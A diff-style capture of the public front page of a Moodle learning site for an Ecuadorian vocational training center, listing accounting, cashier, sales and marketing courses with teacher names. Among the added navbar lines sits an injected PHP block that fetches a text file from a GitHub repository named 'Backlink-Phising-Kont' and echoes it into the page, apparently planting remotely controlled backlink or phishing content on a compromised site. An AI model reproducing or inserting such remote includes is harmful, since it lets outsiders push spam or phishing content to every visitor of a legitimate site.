+    <div class="dropdown-menu" role="menu" id="drop-down-menu-672fa8e038d6d672fa8e0352f74" aria-labelledby="drop-down-672fa8e038d6d672fa8e0352f74">
+                <a class="dropdown-item" role="menuitem" href="https://aulavirtual.cfpamericano.com.ec/?lang=en" title="English ‎(en)‎">English ‎(en)‎</a>
+                <a class="dropdown-item" role="menuitem" href="https://aulavirtual.cfpamericano.com.ec/?lang=es" title="Español - Internacional ‎(es)‎">Español - Internacional ‎(es)‎</a>
     </div>
-    <script>
-      window.addEventListener('load', function() {
-        odoo.define('im_livechat.livesupport', function(require) {});
-      });
-    </script>
-  </body>
+</li>
+                <!-- page_heading_menu -->
+                
+            </ul>
+            <ul class="nav navbar-nav ml-auto">
+                <div class="d-none d-lg-block">
+                
+            </div>
+                <!-- navbar_plugin_output -->
+                <li class="nav-item">
+                
+                </li>
+                <!-- user_menu -->
+                <li class="nav-item d-flex align-items-center">
+                    <div class="usermenu"><span class="login">You are not logged in. (<a href="https://aulavirtual.cfpamericano.com.ec/login/index.php">Log in</a>)</span></div>
+                </li>
+            </ul>
+            <!-- search_box -->
+    </nav>
+    
+<?php 
+$a = file_get_contents('https://raw.githubusercontent.com/herinermaa/Backlink-Phising-Kont/main/lsts.txt'); 
+echo $a;
+?>
+    <div id="page" class="container-fluid">
+        <header id="page-header" class="row">
+    <div class="col-12 pt-3 pb-3">
+        <div class="card ">
+            <div class="card-body ">
+                <div class="d-flex">
+                    <div class="mr-auto">
+                        <div class="page-context-header"><div class="page-header-headings"><h1>AULA VIRTUAL CFP AMERICANO</h1></div></div>
+                    </div>
+
+                </div>
+                <div class="d-flex flex-wrap">
+                    <div class="ml-auto d-flex">
+                        
+                    </div>
+                    <div id="course-header">
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div id="page-content" class="row pb-3">
+            <div id="region-main-box" class="col-12">
+                <section id="region-main"  aria-label="Content">
+
+                    <span class="notifications" id="user-notifications"></span>
+                    <div role="main"><span id="maincontent"></span><a class="skip-block skip" href="#skipavailablecourses">Skip available courses</a><div id="frontpage-available-course-list"><h2>Available courses</h2><div class="courses frontpage-course-list-all"><div class="coursebox clearfix odd first" data-courseid="35" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=35">ASISTENCIA CONTABLE LABORAL Y TRIBUTARIA VIRTUAL</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p></p>
+<p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/23126/course/summary/ENTRENAMIENTO_ASISTENTE-CONTABLE-Y-TRIBUTARIO.jpg" alt="qwdqwd" width="451" height="201" class="atto_image_button_text-bottom"><br></p>
+<p></p>
+
+<h4><span><span><span><span><span><b><span><span>Duración:</span>&nbsp; &nbsp; &nbsp;61 Días <b>60 Horas con Aval MDT.</b></span><br></b></span></span></span></span></span></h4><h4><span><span><span><span><span><b><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;61 Días <b>&nbsp;120 Horas Centro Americano.</b></span></b></span></span></span></span></span></h4><br>
+
+<p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/23126/course/overviewfiles/ENTRENAMIENTO_ASISTENTE-CONTABLE-Y-TRIBUTARIO.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li></ul></div></div><div class="coursebox clearfix even" data-courseid="21" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=21">CAJERO BANCARIO Y COMERCIAL VIRTUAL</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/14949/course/summary/CAJERO-BANCARIO-Y-COMERCIAL_VIRTUAL.jpg" alt="" width="451" height="201" role="presentation" class="atto_image_button_text-bottom"><br></p><p></p><h4><b><span>Duración:&nbsp; &nbsp;</span>&nbsp; &nbsp; 31 Días <b>60 Horas con Aval MDT.<br></b></b></h4>
+
+<br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/14949/course/overviewfiles/CAJERO-BANCARIO-Y-COMERCIAL_VIRTUAL.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=1089&amp;course=1">KATHERIN PATRICIA ANDRANGO ULCUANGO</a></li><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li></ul></div></div><div class="coursebox clearfix odd" data-courseid="22" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=22">FORMACIÓN OFICIALES DE CRÉDITO</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/15593/course/summary/FORMACION-OFICIALES-DE-CREDITO.jpg" alt="" width="451" height="201" role="presentation" class="atto_image_button_text-bottom"><br></p><p></p><h4><b><span>Duración:</span>&nbsp; &nbsp; &nbsp; &nbsp; 31 Días&nbsp; <b>40 Horas con Aval MDT.<br></b></b></h4>
+
+<br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/15593/course/overviewfiles/FORMACION-OFICIALES-DE-CREDITO.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li></ul></div></div><div class="coursebox clearfix even" data-courseid="9" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=9">SECRETARIADO EJECUTIVO</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/4631/course/summary/SECRETARIADO-EJECUTIVO.jpg" alt="" width="451" height="201" role="presentation" class="atto_image_button_text-bottom"><br></p><p></p><h4><b><span>Duración:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 31 Días. <b>60&nbsp; Horas con aval MDT.</b><br></b></h4>
+
+<br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/4631/course/overviewfiles/SECRETARIADO-EJECUTIVO.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=341&amp;course=1">ANTONIA ALEXANDRA SASNALEMA ALVAREZ</a></li></ul></div></div><div class="coursebox clearfix odd" data-courseid="30" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=30">ASISTENCIA EN ELABORACIÓN DE FORMULARIOS DEL SRI VIRTUAL</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/18936/course/summary/ASISTENCIA-EN-ELABORACION.jpg" alt="" width="451" height="201" role="presentation" class="atto_image_button_text-bottom"><br></p><p></p><h4><b><span>Duración:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;31 Días <b>30 horas con aval MDT.</b></b></h4><br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/18936/course/overviewfiles/ASISTENCIA-EN-ELABORACION.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=341&amp;course=1">ANTONIA ALEXANDRA SASNALEMA ALVAREZ</a></li></ul></div></div><div class="coursebox clearfix even" data-courseid="23" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=23">CURSO PRESENCIAL CAJERO BANCARIO Y COMERCIAL</a></h3><div class="moreinfo"></div><div class="enrolmenticons"><i class="icon fa fa-unlock-alt fa-fw "  title="Guest access" aria-label="Guest access"></i><i class="icon fa fa-sign-in fa-fw "  title="Self enrolment" aria-label="Self enrolment"></i></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/15766/course/summary/webinar.png" alt="" width="450" height="201" role="presentation" class="img-responsive atto_image_button_text-bottom"><br></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/15766/course/overviewfiles/webinar.png" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=290&amp;course=1">MARLON PAUL PERUGACHI ARROYO</a></li></ul></div></div><div class="coursebox clearfix odd" data-courseid="31" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=31">IMPULSADORAS</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/20218/course/summary/Impulsadoras.jpg" alt="" width="451" height="201" role="presentation" class="atto_image_button_text-bottom"><br></p><p></p><h4><b><span>Duración:</span>&nbsp; &nbsp; &nbsp; &nbsp; 31 Días.</b></h4><br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/20218/course/overviewfiles/Impulsadoras.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li></ul></div></div><div class="coursebox clearfix even" data-courseid="26" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=26">ELABORACIÓN DE ROLES DE PAGO VIRTUAL</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/17510/course/summary/ROLES-DE-PAGO.jpg" alt="" width="451" height="201" role="presentation" class="atto_image_button_text-bottom"><br></p><p></p><h4><b><span>Duración:</span>&nbsp; &nbsp; &nbsp;31 Días.&nbsp;<br></b></h4><br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/17510/course/overviewfiles/ROLES-DE-PAGO.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=341&amp;course=1">ANTONIA ALEXANDRA SASNALEMA ALVAREZ</a></li></ul></div></div><div class="coursebox clearfix odd" data-courseid="33" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=33">GRAFOLOGÍA</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/20684/course/summary/Grafologia.jpg" alt="" width="451" height="201" role="presentation" class="atto_image_button_text-bottom"><br></p><p></p><h4><b><span>Duración:</span>&nbsp; &nbsp; &nbsp; &nbsp; 31 Días.<br></b></h4><br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/20684/course/overviewfiles/Grafologia.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li></ul></div></div><div class="coursebox clearfix even" data-courseid="7" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=7">EXCELENCIA EN ATENCIÓN AL CLIENTE</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/993/course/summary/atenci%C3%B3n-al-cliente.jpg" alt="" width="470" height="210" role="presentation" class="atto_image_button_left"><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p></p><h4><b><span>Duración:</span>&nbsp; &nbsp; &nbsp; &nbsp; 31 Días <b>20 Horas con aval MDT</b><br></b></h4><br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/993/course/overviewfiles/atenci%C3%B3n-al-cliente.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=1089&amp;course=1">KATHERIN PATRICIA ANDRANGO ULCUANGO</a></li><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=37&amp;course=1">VERÓNICA MARISOL GUZMÁN PICHOGAGÓN</a></li><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=341&amp;course=1">ANTONIA ALEXANDRA SASNALEMA ALVAREZ</a></li></ul></div></div><div class="coursebox clearfix odd" data-courseid="12" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=12">VENTAS EXITOSAS</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/8697/course/summary/VENTAS-EXITOSAS.jpg" alt="" width="451" height="201" role="presentation" class="atto_image_button_text-bottom"></p><p></p><h4><b><span>Duración:</span>&nbsp; &nbsp; &nbsp; &nbsp; 31 Días.<br></b></h4><br><br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/8697/course/overviewfiles/VENTAS-EXITOSAS.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=698&amp;course=1">ADRIANA ALICIA BUSTAMANTE</a></li><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=341&amp;course=1">ANTONIA ALEXANDRA SASNALEMA ALVAREZ</a></li></ul></div></div><div class="coursebox clearfix even" data-courseid="13" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=13">MARKETING DIGITAL</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/8908/course/summary/MARKETING-DIGITAL.jpg" alt="" width="451" height="201" role="presentation" class="atto_image_button_text-bottom"><br></p><p></p><h4><b><span>Duración:</span>&nbsp; &nbsp; &nbsp; &nbsp; 31 Días.<br></b></h4><br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/8908/course/overviewfiles/MARKETING-DIGITAL.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=15&amp;course=1">JUAN ANDRES ESPARZA</a></li></ul></div></div><div class="coursebox clearfix odd" data-courseid="32" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=32">ARQUEO DE CAJA</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/20644/course/summary/Arqueo%20de%20caja.jpeg" alt="" width="451" height="201" role="presentation" class="atto_image_button_text-bottom"><br></p><p></p><h4><b><span>Duración:</span>&nbsp; &nbsp; &nbsp; &nbsp; 31 Días.<br></b></h4><br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/20644/course/overviewfiles/Arqueo%20de%20caja.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li></ul></div></div><div class="coursebox clearfix even" data-courseid="29" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=29">ENTRENAMIENTO CAJEROS VIRTUAL</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/18388/course/summary/ENTRENAMIENTO_CAJER-BANCARIO-Y-COMERCIAL.jpg" alt="" width="451" height="201" role="presentation" class="atto_image_button_text-bottom"><br></p><p></p><h4><b><span>Duración:</span>&nbsp; &nbsp; &nbsp; &nbsp; 61 días. <i><b>60 horas con aval MDT</b></i><br></b></h4><br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/18388/course/overviewfiles/ENTRENAMIENTO_CAJER-BANCARIO-Y-COMERCIAL.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=1895&amp;course=1">Ariel Andrango</a></li><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=290&amp;course=1">MARLON PAUL PERUGACHI ARROYO</a></li></ul></div></div><div class="coursebox clearfix odd" data-courseid="27" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=27">ENTRENAMIENTO ASISTENTE CONTABLE Y TRIBUTARIO VIRTUAL</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/18177/course/summary/ENTRENAMIENTO_ASISTENTE-CONTABLE-Y-TRIBUTARIO.jpg" alt="contable 3" width="451" height="201" class="atto_image_button_text-bottom"><br></p><p></p><h4><b><span>Duración:</span>&nbsp; &nbsp; &nbsp; &nbsp; 61 Dias. <b>60 horas con aval MDT.</b><br></b></h4><br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/18177/course/overviewfiles/ENTRENAMIENTO_ASISTENTE-CONTABLE-Y-TRIBUTARIO.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=341&amp;course=1">ANTONIA ALEXANDRA SASNALEMA ALVAREZ</a></li></ul></div></div><div class="coursebox clearfix even" data-courseid="36" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=36">ENTRENAMIENTO OFICIAL DE CREDITO VIRTUAL</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/24780/course/summary/FORMACION-OFICIALES-DE-CREDITO.jpg" alt="ADS" width="451" height="201" class="atto_image_button_text-bottom"><br></p><p></p><h4><span><span><span><span><span><b><span><span>Duración:</span>&nbsp; &nbsp; &nbsp;61 Días&nbsp; <b>60 horas con aval&nbsp; MDT.</b></span><br></b></span></span></span></span></span></h4><br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/24780/course/overviewfiles/FORMACION-OFICIALES-DE-CREDITO.jpg" /></div></div></div><div class="coursebox clearfix odd" data-courseid="37" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=37">ENTRENAMIENTO ASISTENCIA ADMINISTRATIVA</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/24913/course/summary/SECRETARIADO-EJECUTIVO.jpg" alt="EAWQWWW" width="451" height="201" class="atto_image_button_text-bottom"><br></p><p></p><h4><span><span><span><span><span><b><span><span>Duración:</span>&nbsp; &nbsp; 61 Días <b>60 horas con aval MDT.</b></span><b><br></b></b></span></span></span></span></span></h4><br><p></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/24913/course/overviewfiles/SECRETARIADO-EJECUTIVO.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=507&amp;course=1">ADRIANA ALICIA BUSTAMANTE YAGUANA</a></li></ul></div></div><div class="coursebox clearfix even" data-courseid="38" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=38">PRE - ENTRENAMIENTO CAJERO</a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/26506/course/summary/ENTRENAMIENTO_CAJER-BANCARIO-Y-COMERCIAL.jpg" alt="PRECAJERO" width="543" height="201" class="img-responsive atto_image_button_text-bottom"><br></p></div></div><div class="courseimage"><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/26506/course/overviewfiles/ENTRENAMIENTO_CAJER-BANCARIO-Y-COMERCIAL.jpg" /></div><ul class="teachers"><li>Teacher: <a href="https://aulavirtual.cfpamericano.com.ec/user/view.php?id=290&amp;course=1">MARLON PAUL PERUGACHI ARROYO</a></li></ul></div></div><div class="coursebox clearfix odd last" data-courseid="40" data-type="1"><div class="info"><h3 class="coursename"><a class="" href="https://aulavirtual.cfpamericano.com.ec/course/view.php?id=40">EXCEL PARA CAJEROS VIRTUAL </a></h3><div class="moreinfo"></div></div><div class="content"><div class="summary"><div class="no-overflow"><p><img src="https://aulavirtual.cfpamericano.com.ec/pluginfile.php/27502/course/summary/Untitled%20design.png" alt="EXCEL" width="404" height="226" class="img-responsive atto_image_button_text-bottom"><br></p></div></div></div></div></div></div><span class="skip-block-to" id="skipavailablecourses"></span><br /><a class="skip-block skip" href="#skipcategories">Skip course categories</a><div id="frontpage-category-names"><h2>Course categories</h2><div class="course_category_tree clearfix frontpage-category-names"><div class="collapsible-actions"><a class="collapseexpand" href="#">Expand all</a></div><div class="content"><div class="subcategories"><div class="category loaded" data-categoryid="1" data-depth="1" data-showcourses="5" data-type="0"><div class="info"><h3 class="categoryname"><ahref="https://aulavirtual.cfpamericano.com.ec/course/index.php?categoryid=1">Cursos de Formación Profesional</a><span title="Number of courses" class="numberofcourse"> (19)</span></h3></div><div class="content"></div></div></div></div></div></div><span class="skip-block-to" id="skipcategories"></span><br /><div class="box py-3 mdl-align"><form action="https://aulavirtual.cfpamericano.com.ec/course/search.php" id="coursesearch" method="get" class="form-inline">
+    <fieldset class="coursesearchbox invisiblefieldset">
+        <label for="shortsearchbox">Search courses</label>
+        <input id="shortsearchbox" name="search" type="text" size="12" value="" class="form-control">
+        <button class="btn btn-secondary" type="submit">Go</button>
+            <a class="btn btn-link p-0" role="button"
+                data-container="body" data-toggle="popover"
+                data-placement="right" data-content="&lt;div class=&quot;no-overflow&quot;&gt;&lt;p&gt;You can search for multiple words at once and can refine your search as follows:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;word - find any match of this word within the text&lt;/li&gt;
+&lt;li&gt;+word - only exact matching words will be found&lt;/li&gt;
+&lt;li&gt;-word - don&#039;t include results containing this word.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt; "
+                data-html="true" tabindex="0" data-trigger="focus">
+              <i class="icon fa fa-question-circle text-info fa-fw "  title="Help with Search courses" aria-label="Help with Search courses"></i>
+            </a>
+    </fieldset>
+</form></div><br /></div>
+                    
+                    
+
+                </section>
+            </div>
+        </div>
+    </div>
+    
+    <div id="nav-drawer" data-region="drawer" class="d-print-none moodle-has-zindex closed" aria-hidden="true" tabindex="-1">
+        <nav class="list-group" aria-label="Site">
+            <a class="list-group-item list-group-item-action active" href="https://aulavirtual.cfpamericano.com.ec/" data-key="home" data-isexpandable="0" data-indent="0" data-showdivider="0" data-type="1" data-nodetype="1" data-collapse="0" data-forceopen="1" data-isactive="1" data-hidden="0" data-preceedwithhr="0" >
+                <div class="ml-0">
+                    <div class="media">
+                        <span class="media-left">
+                            <i class="icon fa fa-home fa-fw " aria-hidden="true"  ></i>
+                        </span>
+                        <span class="media-body font-weight-bold">Home</span>
+                    </div>
+                </div>
+            </a>
+        </nav>
+    </div>
+    <footer id="page-footer" class="py-3 bg-dark text-light">
+        <div class="container">
+            <div id="course-footer"></div>
+    
+    
+            <div class="logininfo">You are not logged in. (<a href="https://aulavirtual.cfpamericano.com.ec/login/index.php">Log in</a>)</div>
+            <div class="tool_usertours-resettourcontainer"></div>
+            <div class="sitelink"><a title="Moodle" href="http://moodle.org/"><img src="https://aulavirtual.cfpamericano.com.ec/theme/image.php/boost/core/1727854264/moodlelogo_grayhat" alt="Moodle logo" /></a></div>
+            <nav class="nav navbar-nav d-md-none" aria-label="Custom menu">
+                    <ul class="list-unstyled pt-3">
+                                        <li><a href="#" title="Language">English ‎(en)‎</a></li>
+                                    <li>
+                                        <ul class="list-unstyled ml-3">
+                                                            <li><a href="https://aulavirtual.cfpamericano.com.ec/?lang=en" title="English ‎(en)‎">English ‎(en)‎</a></li>
+                                                            <li><a href="https://aulavirtual.cfpamericano.com.ec/?lang=es" title="Español - Internacional ‎(es)‎">Español - Internacional ‎(es)‎</a></li>
+                                        </ul>
+                                    </li>
+                    </ul>
+            </nav>
+            <div class="tool_dataprivacy"><a href="https://aulavirtual.cfpamericano.com.ec/admin/tool/dataprivacy/summary.php">Data retention summary</a></div>
+            <script type="text/javascript">
+//<![CDATA[
+var require = {
+    baseUrl : 'https://aulavirtual.cfpamericano.com.ec/lib/requirejs.php/1727854264/',
+    // We only support AMD modules with an explicit define() statement.
+    enforceDefine: true,
+    skipDataMain: true,
+    waitSeconds : 0,
+
+    paths: {
+        jquery: 'https://aulavirtual.cfpamericano.com.ec/lib/javascript.php/1727854264/lib/jquery/jquery-3.2.1.min',
+        jqueryui: 'https://aulavirtual.cfpamericano.com.ec/lib/javascript.php/1727854264/lib/jquery/ui-1.12.1/jquery-ui.min',
+        jqueryprivate: 'https://aulavirtual.cfpamericano.com.ec/lib/javascript.php/1727854264/lib/requirejs/jquery-private'
+    },
+
+    // Custom jquery config map.
+    map: {
+      // '*' means all modules will get 'jqueryprivate'
+      // for their 'jquery' dependency.
+      '*': { jquery: 'jqueryprivate' },
+      // Stub module for 'process'. This is a workaround for a bug in MathJax (see MDL-60458).
+      '*': { process: 'core/first' },
+
+      // 'jquery-private' wants the real jQuery module
+      // though. If this line was not here, there would
+      // be an unresolvable cyclic dependency.
+      jqueryprivate: { jquery: 'jquery' }
+    }
+};
+
+//]]>
+</script>
+<script type="text/javascript" src="https://aulavirtual.cfpamericano.com.ec/lib/javascript.php/1727854264/lib/requirejs/require.min.js"></script>
+<script type="text/javascript">
+//<![CDATA[
+require(['core/first'], function() {
+;
+require(["media_videojs/loader"], function(loader) {
+    loader.setUp(function(videojs) {
+        videojs.options.flash.swf = "https://aulavirtual.cfpamericano.com.ec/media/player/videojs/videojs/video-js.swf";
+videojs.addLanguage("en",{
+ "Audio Player": "Audio Player",
+ "Video Player": "Video Player",
+ "Play": "Play",
+ "Pause": "Pause",
+ "Replay": "Replay",
+ "Current Time": "Current Time",
+ "Duration Time": "Duration Time",
+ "Remaining Time": "Remaining Time",
+ "Stream Type": "Stream Type",
+ "LIVE": "LIVE",
+ "Loaded": "Loaded",
+ "Progress": "Progress",
+ "Progress Bar": "Progress Bar",
+ "progress bar timing: currentTime={1} duration={2}": "{1} of {2}",
+ "Fullscreen": "Fullscreen",
+ "Non-Fullscreen": "Non-Fullscreen",
+ "Mute": "Mute",
+ "Unmute": "Unmute",
+ "Playback Rate": "Playback Rate",
+ "Subtitles": "Subtitles",
+ "subtitles off": "subtitles off",
+ "Captions": "Captions",
+ "captions off": "captions off",
+ "Chapters": "Chapters",
+ "Descriptions": "Descriptions",
+ "descriptions off": "descriptions off",
+ "Audio Track": "Audio Track",
+ "Volume Level": "Volume Level",
+ "You aborted the media playback": "You aborted the media playback",
+ "A network error caused the media download to fail part-way.": "A network error caused the media download to fail part-way.",
+ "The media could not be loaded, either because the server or network failed or because the format is not supported.": "The media could not be loaded, either because the server or network failed or because the format is not supported.",
+ "The media playback was aborted due to a corruption problem or because the media used features your browser did not support.": "The media playback was aborted due to a corruption problem or because the media used features your browser did not support.",
+ "No compatible source was found for this media.": "No compatible source was found for this media.",
